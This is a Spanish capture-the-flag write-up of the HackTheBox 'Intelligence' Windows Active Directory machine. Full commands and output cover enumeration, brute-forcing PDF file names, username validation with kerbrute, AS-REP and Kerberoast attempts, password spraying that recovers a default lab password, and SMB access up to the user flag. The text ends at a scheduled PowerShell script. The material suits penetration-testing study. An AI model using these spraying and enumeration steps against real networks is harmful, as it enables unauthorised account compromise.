---
layout: post
title: "HackTheBox - Intelligence (medium)"
categories: hackthebox/machines/medium
---

<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/78c5d8511bae13864c72ba8df1329e8d.png">
</p>

- Intelligence is a medium difficulty Windows machine that showcases a number of common attacks in an Active Directory environment. After retrieving internal PDF documents stored on the web server (by brute-forcing a common naming scheme) and inspecting their contents and metadata, which reveal a default password and a list of potential AD users, password spraying leads to the discovery of a valid user account, granting initial foothold on the system. A scheduled PowerShell script that sends authenticated requests to web servers based on their hostname is discovered; by adding a custom DNS record, it is possible to force a request that can be intercepted to capture the hash of a second user, which is easily crackable. This user is allowed to read the password of a group managed service account, which in turn has constrained delegation access to the domain controller, resulting in a shell with administrative privileges.

## PortScan

```bash
❯ sudo nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49669,49691,49692,49696,49713,50192 10.10.10.248 -oN targeted
[sudo] password for miguelrega7: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 18:48 CST
Nmap scan report for 10.10.10.248
Host is up (0.11s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Intelligence
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-06 07:48:52Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
49669/tcp filtered unknown
49691/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open     msrpc         Microsoft Windows RPC
49696/tcp filtered unknown
49713/tcp filtered unknown
50192/tcp filtered unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-06T07:49:43
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m58s
```

## Enumeración

```bash
❯ crackmapexec smb 10.10.10.248
SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
```

- Vamos agregar los nombres de dominio al `/etc/hosts`.

```bash
❯ echo "10.10.10.248 dc.intelligence.htb intelligence.htb" | sudo tee -a /etc/hosts
10.10.10.248 dc.intelligence.htb intelligence.htb
```

- No podemos enumerar por `smb` con `crackmapexec`.

```bash
❯ crackmapexec smb 10.10.10.248 -u "miguel" -p "" --shares
SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\miguel: STATUS_LOGON_FAILURE 
```

- Si probamos otra herramienta vemos que no nos reporta ningún recurso compartido.

```bash
❯ smbclient -L 10.10.10.248 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.248 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```bash
❯ smbmap -H 10.10.10.248 --no-banner
[\] Checking for open ports...                                                                                                  [|] Checking for open ports...                                                                                                  [/] Checking for open ports...                                                                                                  [*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[*] Closed 1 connections        
```

- Si intentamos enumerar por el protocolo RPC no nos deja.

```bash
❯ rpcclient -N -U "" 10.10.10.248
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

- Esta es la pagina web.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/1.png">
</p>

- Estas son las tecnologías que esta usando.

```ruby
❯ whatweb http://10.10.10.248
http://10.10.10.248 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@intelligence.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.248], JQuery, Microsoft-IIS[10.0], Script, Title[Intelligence]
```

- En el apartado de las imágenes hay 2 botones los cuales nos dice Download son archivos .pdf este es su contenido.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/2.png">
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/3.png">
</p>

- Vamos a descargarlos para ver los metadatos.

```bash
❯ wget http://10.10.10.248/documents/2020-01-01-upload.pdf
--2024-08-05 19:20:52--  http://10.10.10.248/documents/2020-01-01-upload.pdf
Connecting to 10.10.10.248:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 26835 (26K) [application/pdf]
Saving to: ‘2020-01-01-upload.pdf’

2020-01-01-upload.pdf           100%[=======================================================>]  26.21K  --.-KB/s    in 0.1s    

2024-08-05 19:20:53 (256 KB/s) - ‘2020-01-01-upload.pdf’ saved [26835/26835]

                                                                                                                                
❯ wget http://10.10.10.248/documents/2020-12-15-upload.pdf
--2024-08-05 19:21:00--  http://10.10.10.248/documents/2020-12-15-upload.pdf
Connecting to 10.10.10.248:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27242 (27K) [application/pdf]
Saving to: ‘2020-12-15-upload.pdf’

2020-12-15-upload.pdf           100%[=======================================================>]  26.60K  --.-KB/s    in 0.1s    

2024-08-05 19:21:00 (246 KB/s) - ‘2020-12-15-upload.pdf’ saved [27242/27242]
```

- Encontramos el nombre de los creadores.

```bash
❯ exiftool 2020-01-01-upload.pdf
ExifTool Version Number         : 12.76
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 11:00:00-06:00
File Access Date/Time           : 2024:08:05 19:20:53-06:00
File Inode Change Date/Time     : 2024:08:05 19:20:53-06:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee

❯ exiftool 2020-12-15-upload.pdf
ExifTool Version Number         : 12.76
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 11:00:00-06:00
File Access Date/Time           : 2024:08:05 19:21:00-06:00
File Inode Change Date/Time     : 2024:08:05 19:21:00-06:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
```

- Como tenemos los nombres de creadores lo mas probable es que sean usuarios del dominio pero podemos hacer Fuzzing para encontrar mas PDFs en caso de que los allá y descargarlos.

- Vamos a descargar solo los que existan para extraer los nombres de los creadores.

```bash
❯ for i in {2020..2022}; do for j in {01..12}; do for k in {01..31}; do echo "http://10.10.10.248/documents/$i-$j-$k-upload.pdf"; done; done; done | xargs -n 1 -P 20 wget
```

- Como son demasiados usuarios vamos a filtrar por sus nombres y meterlos a una lista.

```bash
❯ exiftool * .pdf | grep "Creator" | awk 'NF{print $NF}'
William.Lee
William.Lee
Scott.Scott
Jason.Wright
Veronica.Patel
Jennifer.Thomas
Danny.Matthews
David.Reed
Stephanie.Young
Daniel.Shelton
Jose.Williams
John.Coleman
Jason.Wright
Jose.Williams
Daniel.Shelton
Brian.Morris
Jennifer.Thomas
Thomas.Valenzuela
Travis.Evans
Samuel.Richardson
Richard.Williams
David.Mcbride
Jose.Williams
John.Coleman
William.Lee
Anita.Roberts
Brian.Baker
Jose.Williams
David.Mcbride
Kelly.Long
John.Coleman
Jose.Williams
Nicole.Brock
Thomas.Valenzuela
David.Reed
Kaitlyn.Zimmerman
Jason.Patterson
Thomas.Valenzuela
David.Mcbride
Darryl.Harris
William.Lee
Stephanie.Young
David.Reed
Nicole.Brock
David.Mcbride
William.Lee
Stephanie.Young
John.Coleman
David.Wilson
Scott.Scott
Teresa.Williamson
John.Coleman
Veronica.Patel
John.Coleman
Samuel.Richardson
Ian.Duncan
Nicole.Brock
William.Lee
Jason.Wright
Travis.Evans
David.Mcbride
Jessica.Moody
Ian.Duncan
Jason.Wright
Richard.Williams
Tiffany.Molina
Jose.Williams
Jessica.Moody
Brian.Baker
Anita.Roberts
Teresa.Williamson
Kaitlyn.Zimmerman
Jose.Williams
Stephanie.Young
Samuel.Richardson
Tiffany.Molina
Ian.Duncan
Kelly.Long
Travis.Evans
Ian.Duncan
Jose.Williams
Jose.Williams
David.Wilson
Thomas.Hall
Ian.Duncan
Error: File not found - .pdf
Jason.Patterson
Stephanie.Young
Kaitlyn.Zimmerman
Travis.Evans
Kelly.Long
Danny.Matthews
Travis.Evans
Jessica.Moody
Thomas.Valenzuela
Anita.Roberts
Stephanie.Young
David.Reed
Jose.Williams
Veronica.Patel
Ian.Duncan
Richard.Williams
```

- Como hay repeticiones vamos aplicar un `sort` para eliminar las repeticiones.

```bash
❯ exiftool * .pdf | grep "Creator" | awk 'NF{print $NF}' | sort -u
Error: File not found - .pdf
Anita.Roberts
Brian.Baker
Brian.Morris
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
Ian.Duncan
Jason.Patterson
Jason.Wright
Jennifer.Thomas
Jessica.Moody
John.Coleman
Jose.Williams
Kaitlyn.Zimmerman
Kelly.Long
Nicole.Brock
Richard.Williams
Samuel.Richardson
Scott.Scott
Stephanie.Young
Teresa.Williamson
Thomas.Hall
Thomas.Valenzuela
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee
```

```bash
❯ exiftool *.pdf | grep "Creator" | awk 'NF{print $NF}' | sort -u > users.txt
```

- Ahora vamos a comprobar que los usuarios sean validos.

```bash
❯ /opt/kerbrute_linux_amd64 userenum --dc dc.intelligence.htb -d intelligence.htb users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/05/24 - Ronnie Flathers @ropnop

2024/08/05 19:47:26 >  Using KDC(s):
2024/08/05 19:47:26 >  	dc.intelligence.htb:88

2024/08/05 19:47:26 >  [+] VALID USERNAME:	Anita.Roberts@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Ian.Duncan@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	David.Wilson@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	David.Reed@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Brian.Baker@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Darryl.Harris@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Daniel.Shelton@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Brian.Morris@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	David.Mcbride@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Danny.Matthews@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Jason.Wright@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Jason.Patterson@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Jose.Williams@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Kelly.Long@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Kaitlyn.Zimmerman@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Jennifer.Thomas@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	John.Coleman@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Jessica.Moody@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Richard.Williams@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Nicole.Brock@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Samuel.Richardson@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Stephanie.Young@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Teresa.Williamson@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Scott.Scott@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Thomas.Valenzuela@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Travis.Evans@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Veronica.Patel@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Thomas.Hall@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	Tiffany.Molina@intelligence.htb
2024/08/05 19:47:26 >  [+] VALID USERNAME:	William.Lee@intelligence.htb
```

- Son existentes así que vamos a probar un `ASREPRoast` <https://www.hackplayers.com/2020/11/asreproast-o-as-rep-roasting.html>.

- Ningún usuario es vulnerable.

```bash
❯ impacket-GetNPUsers intelligence.htb/ -no-pass -usersfile users.txt
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] User Anita.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Brian.Baker doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Brian.Morris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Daniel.Shelton doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Danny.Matthews doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darryl.Harris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Mcbride doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Reed doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Wilson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ian.Duncan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jason.Patterson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jason.Wright doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jennifer.Thomas doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jessica.Moody doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User John.Coleman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kaitlyn.Zimmerman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kelly.Long doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Nicole.Brock doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Richard.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Samuel.Richardson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Scott.Scott doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Stephanie.Young doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Teresa.Williamson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Thomas.Hall doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Thomas.Valenzuela doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Tiffany.Molina doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Travis.Evans doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Veronica.Patel doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set
```

- En los PDFs sabemos que tienen contenido así que vamos a utilizar la siguiente herramienta para ver si en los textos hay alguna contraseña <https://github.com/jalan/pdftotext>.

```bash
❯ for file in $(ls); do echo $file; done | grep -v users.txt | while read filename; do pdftotext $filename; done
```

- Si examinamos los `.txt` vemos una contraseña.

```bash
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: 2020-06-04-upload.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ New Account Guide
   2   │ Welcome to Intelligence Corp!
   3   │ Please login using your username and the default password of:
   4   │ NewIntelligenceCorpUser9876
   5   │ After logging in please change your password as soon as possible.
   6   │ 
   7   │ ^L
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

## SMB

- Como tenemos una contraseña podemos usar `crackmapexec` para saber de quien es la contraseña.

```bash
❯ crackmapexec smb 10.10.10.248 -u users.txt -p 'NewIntelligenceCorpUser9876'
SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
```

- Tenemos credenciales.

```bash
❯ /bin/cat creds.txt
Tiffany.Molina:NewIntelligenceCorpUser9876 
```

- Las credenciales son para el protocolo `SMB`.

```bash
❯ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p "NewIntelligenceCorpUser9876"
SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
```

- Como tenemos credenciales validas podemos probar un Kerberoasting Attack para solicitar un `TGS` <https://book.hacktricks.xyz/v/es/windows-hardening/active-directory-methodology/kerberoast>.

- Pero no es vulnerable.

```bash
❯ impacket-GetUserSPNs intelligence.htb/Tiffany.Molina:NewIntelligenceCorpUser9876
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

No entries found!
```

## User flag

- Podemos enumerar por `SMB`.

```bash
❯ smbmap -H 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --no-banner
[\] Checking for open ports...                                                                                                  [|] Checking for open ports...                                                                                                  [/] Checking for open ports...                                                                                                  [-] Checking for open ports...                                                                                                  [*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.10.10.248:445	Name: dc.intelligence.htb 	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	IT                                                	READ ONLY	
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
[*] Closed 1 connections                                                                        
```

- Vamos a ver que es lo que hay dentro de Users.

```bash
❯ smbclient -U Tiffany.Molina //10.10.10.248/Users
Password for [WORKGROUP\Tiffany.Molina]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sun Apr 18 20:20:26 2021
  ..                                 DR        0  Sun Apr 18 20:20:26 2021
  Administrator                       D        0  Sun Apr 18 19:18:39 2021
  All Users                       DHSrn        0  Sat Sep 15 02:21:46 2018
  Default                           DHR        0  Sun Apr 18 21:17:40 2021
  Default User                    DHSrn        0  Sat Sep 15 02:21:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 02:11:27 2018
  Public                             DR        0  Sun Apr 18 19:18:39 2021
  Ted.Graves                          D        0  Sun Apr 18 20:20:26 2021
  Tiffany.Molina                      D        0  Sun Apr 18 19:51:46 2021

		3770367 blocks of size 4096. 1437659 blocks available
smb: \> 
```

- Vemos la flag.

```bash
smb: \> cd Tiffany.Molina\
smb: \Tiffany.Molina\> dir
  .                                   D        0  Sun Apr 18 19:51:46 2021
  ..                                  D        0  Sun Apr 18 19:51:46 2021
  AppData                            DH        0  Sun Apr 18 19:51:46 2021
  Application Data                DHSrn        0  Sun Apr 18 19:51:46 2021
  Cookies                         DHSrn        0  Sun Apr 18 19:51:46 2021
  Desktop                            DR        0  Sun Apr 18 19:51:46 2021
  Documents                          DR        0  Sun Apr 18 19:51:46 2021
  Downloads                          DR        0  Sat Sep 15 02:12:33 2018
  Favorites                          DR        0  Sat Sep 15 02:12:33 2018
  Links                              DR        0  Sat Sep 15 02:12:33 2018
  Local Settings                  DHSrn        0  Sun Apr 18 19:51:46 2021
  Music                              DR        0  Sat Sep 15 02:12:33 2018
  My Documents                    DHSrn        0  Sun Apr 18 19:51:46 2021
  NetHood                         DHSrn        0  Sun Apr 18 19:51:46 2021
  NTUSER.DAT                        AHn   131072  Sun Aug 11 17:42:51 2024
  ntuser.dat.LOG1                   AHS    86016  Sun Apr 18 19:51:46 2021
  ntuser.dat.LOG2                   AHS        0  Sun Apr 18 19:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf    AHS    65536  Sun Apr 18 19:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Sun Apr 18 19:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Sun Apr 18 19:51:46 2021
  ntuser.ini                        AHS       20  Sun Apr 18 19:51:46 2021
  Pictures                           DR        0  Sat Sep 15 02:12:33 2018
  Recent                          DHSrn        0  Sun Apr 18 19:51:46 2021
  Saved Games                         D        0  Sat Sep 15 02:12:33 2018
  SendTo                          DHSrn        0  Sun Apr 18 19:51:46 2021
  Start Menu                      DHSrn        0  Sun Apr 18 19:51:46 2021
  Templates                       DHSrn        0  Sun Apr 18 19:51:46 2021
  Videos                             DR        0  Sat Sep 15 02:12:33 2018

		3770367 blocks of size 4096. 1437659 blocks available
smb: \Tiffany.Molina\> cd Desktop
smb: \Tiffany.Molina\Desktop\> dir
  .                                  DR        0  Sun Apr 18 19:51:46 2021
  ..                                 DR        0  Sun Apr 18 19:51:46 2021
  user.txt                           AR       34  Sun Aug 11 17:33:28 2024

		3770367 blocks of size 4096. 1437643 blocks available
smb: \Tiffany.Molina\Desktop\> get user.txt
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \Tiffany.Molina\Desktop\> 
```

```bash
❯ cat user.txt
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: user.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ d07ff52158e75818a204e25d39744c93
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

## Shell as nt authority system and root flag

- Si seguimos enumerando encontramos un script en powershell.

```bash
❯ smbclient -U Tiffany.Molina //10.10.10.248/IT
Password for [WORKGROUP\Tiffany.Molina]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr 18 19:50:55 2021
  ..                                  D        0  Sun Apr 18 19:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 19:50:55 2021

		3770367 blocks of size 4096. 1437627 blocks available
smb: \> get downdetector.ps1 
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (2.4 KiloBytes/sec) (average 2.4 KiloBytes/sec)
```

- Este script lo que esta haciendo es acceder a LDAP y obtiene una lista de todas las computadoras, luego recorre aquellas cuyo nombre comienza con "web". Intentará realizar una solicitud web a ese servidor (usando las credenciales del usuario en ejecución), y si el código de estado no es 200, enviará un correo electrónico a Ted.Graves para informarle que el host está caído. El comentario al principio indica que está programado para ejecutarse cada cinco minutos.

```bash
❯ cat downdetector.ps1
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: downdetector.ps1   <UTF-16LE>
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Check web server status. Scheduled to run every 5min
   2   │ Import-Module ActiveDirectory 
   3   │ foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Wh
       │ ere-Object Name -like "web*")  {
   4   │ try {
   5   │ $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
   6   │ if(.StatusCode -ne 200) {
   7   │ Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subje
       │ ct "Host: $($record.Name) is down"
   8   │ }
   9   │ } catch {}
  10   │ }
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
